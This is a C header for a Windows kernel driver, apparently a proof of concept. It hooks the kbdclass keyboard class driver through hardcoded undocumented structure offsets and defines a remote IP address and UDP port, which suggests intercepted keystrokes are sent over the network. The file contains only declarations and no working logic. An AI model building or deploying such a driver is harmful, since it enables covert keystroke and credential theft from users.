#pragma once

#include <ntifs.h>
#include <ntddk.h>
#include <ntddkbd.h>

const static ULONG gTraceFlags = 0x00000001;
extern POBJECT_TYPE* IoDriverObjectType;

#define PTDBG_TRACE_ROUTINES            0x00000001
#define PTDBG_TRACE_OPERATION_STATUS    0x00000002

#define PT_DBG_PRINT( _dbgLevel, _string )          \
    (FlagOn(gTraceFlags,(_dbgLevel)) ?              \
        DbgPrint _string :                          \
        ((int)0))

#define POC_NONPAGED_POOL_TAG           'Pocp'

/*
* kbdclass的DeviceExtension结构体某些项的偏移，
* 虽然未导出，但这几个值的偏移从Windows 8 x64开始，都是不变的
*/
#ifdef _WIN64

#define REMOVE_LOCK_OFFET_DE            0x20
#define SPIN_LOCK_OFFSET_DE             0xA0
#define READ_QUEUE_OFFSET_DE            0xA8

#else

#define REMOVE_LOCK_OFFET_DE            0x10
#define SPIN_LOCK_OFFSET_DE             0x6C
#define READ_QUEUE_OFFSET_DE            0x70

#endif

#define POC_IP_ADDRESS                  L"192.168.10.107"
#define POC_UDP_PORT                    L"10017"

typedef struct _POC_KBDCLASS_OBJECT
{
    LIST_ENTRY ListEntry;

    BOOLEAN InitSuccess;
    BOOLEAN SafeUnload;
    BOOLEAN IrpCancel;

    PIRP NewIrp;
    PIRP RemoveLockIrp;

    KEVENT Event;

    PFILE_OBJECT KbdFileObject;
    PDEVICE_OBJECT BttmDeviceObject;
    PDEVICE_OBJECT KbdDeviceObject;

    ERESOURCE Resource;
}
POC_KBDCLASS_OBJECT, * PPOC_KBDCLASS_OBJECT;

typedef struct _DEVICE_EXTENSION 
{
    KSPIN_LOCK gKbdObjSpinLock;
    LIST_ENTRY gKbdObjListHead;

    PDRIVER_OBJECT gKbdDriverObject;

    BOOLEAN gIsUnloading;
}
DEVICE_EXTENSION, * PDEVICE_EXTENSION;

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
);

VOID 
PocUnload(
    _In_ PDRIVER_OBJECT  DriverObject
);

NTSTATUS
ObReferenceObjectByName(
    __in PUNICODE_STRING ObjectName,
    __in ULONG Attributes,
    __in_opt PACCESS_STATE AccessState,
    __in_opt ACCESS_MASK DesiredAccess,
    __in POBJECT_TYPE ObjectType,
    __in KPROCESSOR_MODE AccessMode,
    __inout_opt PVOID ParseContext,
    __out PVOID* Object
);

#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#endif
